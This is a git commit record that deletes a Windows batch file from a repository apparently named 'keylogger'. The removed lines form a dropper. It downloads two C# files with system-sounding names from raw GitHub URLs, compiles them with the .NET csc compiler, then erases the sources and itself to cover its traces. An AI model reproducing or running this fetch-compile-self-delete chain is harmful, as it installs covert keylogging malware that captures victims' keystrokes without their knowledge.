4f80f3dcbc76e9965d25bf833860fff9ff6138fe
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-08 09:23:09 -0300

    Delete full.bat

--- full.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/user64xdll.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe user64xdll.cs
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscr.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscr.cs
-erase user64xdll.cs & erase winscr.cs & erase full.bat
